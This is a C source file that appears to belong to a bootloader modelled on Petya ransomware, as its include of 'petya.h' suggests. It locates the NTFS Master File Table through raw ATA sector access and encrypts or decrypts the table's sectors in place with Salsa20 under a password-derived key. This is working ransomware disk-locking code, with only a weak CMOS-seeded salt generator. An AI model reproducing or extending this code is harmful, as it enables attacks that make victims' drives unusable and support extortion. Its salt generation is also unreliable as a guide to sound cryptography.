// ntfs_crypt.c

#include "ntfs_crypt.h"
#include "ata.h"
#include "kdf.h"
#include "salsa20.h"
#include "petya.h"
#include "bootloader.h"

static uint32_t prng_state = 0;

static void prng_seed(void)
{
    uint32_t val = 0;
    __asm__ volatile (
        "xor %%eax, %%eax\n"
        "in %%dx, %%al\n"
        : "=a"(val) : "d"(0x70)
    );
    prng_state = val ^ 0xDEADBEEF;
}

static uint32_t prng_next(void)
{
    // xor and shift
    prng_state ^= prng_state << 13;
    prng_state ^= prng_state >> 17;
    prng_state ^= prng_state << 5;
    
    return prng_state;
}

static int read_salt(uint8_t salt[SALT_SIZE])
{
    uint8_t sector[512];
    if (ata_read(SALT_SECTOR, 1, sector) != 0)
        return -1;

    if (sector[16] != 0x53 || sector[17] != 0x41 || sector[18] != 0x4C || sector[19] != 0x54)
    {
        vga_puts("Salt sector: invalid magic marker or not initialized!\n");
        return -1;
    }

    for (int i = 0; i < SALT_SIZE; i++)
        salt[i] = sector[i];

    return 0;
}

static int get_mft_lba(uint32_t partition_lba, uint32_t *mft_lba_out)
{
    uint8_t vbr[512];
    if (ata_read(partition_lba, 1, vbr) != 0)
        return -1;

    // check NTFS signature
    if (vbr[3] != 'N' || vbr[4] != 'T' || vbr[5] != 'F' || vbr[6] != 'S')
    {
        vga_puts("Not NTFS!\n");
        return -1;
    }

    uint8_t sectors_per_cluster = vbr[13];
    uint64_t mft_cluster = 0;
    for (int i = 0; i < 8; i++)
        mft_cluster |= (uint64_t)vbr[48 + i] << (i * 8);

    *mft_lba_out = (uint32_t)(partition_lba + mft_cluster * sectors_per_cluster);

    return 0;
}

static int ntfs_mft_crypt(const char *password, uint32_t partition_lba, int encryption)
{
    uint8_t salt[SALT_SIZE];
    if (read_salt(salt) != 0)
        return -1;

    vga_puts(encryption ? "Deriving key for encryption..." : "Deriving key for decryption...");
    vga_putchar('\n');

    // derive key from password + salt
    uint8_t key[32];
    kdf_derive(key, password, salt, KDF_ITERATIONS);

    // find MFT location
    uint32_t mft_lba;
    if (get_mft_lba(partition_lba, &mft_lba) != 0)
    {
        vga_puts("Failed to retrieve MFT!\n");
        return -1;
    }

    vga_puts("MFT at LBA: ");
    vga_put_hex(mft_lba);
    vga_putchar('\n');

    uint8_t sector_buffer[512];
    uint8_t out_buffer[512];

    vga_puts(encryption ? "Encrypting..." : "Decrypting...");
    vga_puts("MFT [");

    for (uint32_t i = 0; i < MFT_ENCRYPT_SECTORS; i++)
    {
        // read MFT and check error
        if (ata_read(mft_lba + i, 1, sector_buffer) != 0)
        {
            vga_puts("\nRead error at sector ");
            vga_put_hex(mft_lba + i);
            vga_putchar('\n');

            return -1;
        }

        uint8_t nonce[8] = { 0 };
        nonce[0] = (uint8_t)i;
        nonce[1] = (uint8_t)(i >> 8);
        nonce[2] = (uint8_t)(i >> 16);
        nonce[3] = (uint8_t)(i >> 24);

        Salsa20_Ctx ctx;
        salsa20_init(&ctx, key, nonce, 0);
        salsa20_encrypt(&ctx, sector_buffer, out_buffer, 512);

        if (ata_write(mft_lba + i, 1, out_buffer) != 0)
        {
            vga_puts("\nWrite error at sector ");
            vga_put_dec(mft_lba + i);
            vga_putchar('\n');

            return -1;
        }

        if (i % 16 == 0)
            vga_putchar('#');
    }

    vga_puts("]\nDone.\n");

    for (int i = 0; i < 32; i++)
        key[i] = 0;

    return 0;
}

int ntfs_generate_salt(void)
{
    uint8_t sector[512] = { 0 };
    
    prng_seed();

    uint8_t *salt = sector;
    for (int i = 0; i < SALT_SIZE; i += 4)
    {
        uint32_t r = prng_next();
        salt[i+0] = (uint8_t)r;
        salt[i+1] = (uint8_t)(r >> 8);
        salt[i+2] = (uint8_t)(r >> 16);
        salt[i+3] = (uint8_t)(r >> 24);
    }

    sector[16] = 0x53;
    sector[17] = 0x41;
    sector[18] = 0x4C;
    sector[19] = 0x54;

    if (ata_write(SALT_SECTOR, 1, sector) != 0)
    {
        vga_puts("ntfs_generate_salt: write failed\n");
        return -1;
    }

    vga_puts("Salt is generated and saved to sector ");
    vga_put_dec(SALT_SECTOR);
    vga_putchar('\n');

    return 0;
}

int ntfs_mft_encrypt(const char *password, uint32_t partition_lba)
{
    uint8_t salt[SALT_SIZE];
    if (read_salt(salt) != 0)
        return -1;

    uint8_t key[32];
    kdf_derive(key, password, salt, KDF_ITERATIONS);

    uint32_t mft_lba;
    if (get_mft_lba(partition_lba, &mft_lba) != 0)
    {
        for (int i = 0; i < 32; i++)
            key[i] = 0;
        
        return -1;
    }

    vga_puts("Encrypting MFT [");
    
    uint8_t sector_buffer[512];
    uint8_t out_buffer[512];
    for (uint32_t i = 0; i < MFT_ENCRYPT_SECTORS; i++)
    {
        if (ata_read(mft_lba + i, 1, sector_buffer) != 0)
        {
            vga_puts("\nRead error!\n");
            for (int j = 0; j < 32; j++)
                key[j] = 0;

            return -1;
        }

        uint8_t nonce[8] = { 0 };
        nonce[0] = (uint8_t)i;
        nonce[1] = (uint8_t)(i >> 8);
        nonce[2] = (uint8_t)(i >> 16);
        nonce[3] = (uint8_t)(i >> 24);

        Salsa20_Ctx ctx;
        salsa20_init(&ctx, key, nonce, 0);
        salsa20_encrypt(&ctx, sector_buffer, out_buffer, 512);

        if (ata_write(mft_lba + i, 1, out_buffer) != 0)
        {
            vga_puts("\nWrite error!\n");
            for (int j = 0; j < 32; j++)
                key[j] = 0;

            return -1;
        }

        if (i % 16 == 0)
            vga_putchar('#');
    }

    vga_puts("]\n");

    validate_save_tag(key);

    for (int i = 0; i < 32; i++)
        key[i] = 0;

    return 0;
}

int ntfs_mft_decrypt(const char *password, uint32_t partition_lba)
{
    uint8_t salt[SALT_SIZE];
    if (read_salt(salt) != 0)
        return -1;

    vga_puts("Deriving key...\n");
    uint8_t key[32];
    kdf_derive(key, password, salt, KDF_ITERATIONS);

    vga_puts("Validating key...\n");
    if (!validate_check_key(key))
    {
        vga_puts("Validation failed: wrong password.\n");
        vga_puts("MFT untouched.\n");

        for (int i = 0; i < 32; i++)
            key[i] = 0;

        return -1;
    }

    vga_puts("Password is validated.\n");
    
    uint32_t mft_lba;
    if (get_mft_lba(partition_lba, &mft_lba) != 0)
    {
        for (int i = 0; i < 32; i++)
            key[i] = 0;

        return -1;
    }

    vga_puts("Decrypting MFT [");

    uint8_t sector_buffer[512];
    uint8_t out_buffer[512];

    for (uint32_t i = 0; i < MFT_ENCRYPT_SECTORS; i++)
    {
        if (ata_read(mft_lba + i, 1, sector_buffer) != 0)
        {
            vga_puts("\nRead error!\n");
            for (int i = 0; i < 32; i++)
                key[i] = 0;

            return -1;
        }

        uint8_t nonce[8] = { 0 };
        nonce[0] = (uint8_t)i;
        nonce[1] = (uint8_t)(i >> 8);
        nonce[2] = (uint8_t)(i >> 16);
        nonce[3] = (uint8_t)(i >> 24);

        Salsa20_Ctx ctx;
        salsa20_init(&ctx, key, nonce, 0);
        salsa20_decrypt(&ctx, sector_buffer, out_buffer, 512);

        if (ata_write(mft_lba + i, 1, out_buffer) != 0)
        {
            vga_puts("\nWrite error!\n");
            for (int i = 0; i < 32; i++)
                key[i] = 0;

            return -1;
        }

        if (i % 16 == 0)
            vga_putchar('#');
    }

    vga_puts("]\n");

    //validate_save_tag(key);

    for (int i = 0; i < 32; i++)
        key[i] = 0;

    return 0;
}